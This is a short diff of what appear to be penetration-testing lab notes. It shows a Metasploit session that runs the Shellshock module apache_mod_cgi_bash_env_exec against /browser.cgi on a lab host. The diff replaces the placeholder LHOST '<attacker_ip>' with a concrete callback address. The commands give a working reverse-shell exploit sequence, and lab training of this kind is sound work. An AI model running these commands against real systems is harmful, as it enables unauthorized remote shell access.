@@ -23,7 +23,7 @@ msfconsole -q
 use exploit/multi/http/apache_mod_cgi_bash_env_exec
 set RHOSTS target1.ine.local
 set TARGETURI /browser.cgi
-set LHOST <attacker_ip>
+set LHOST 10.4.23.61
 exploit
 ```
 
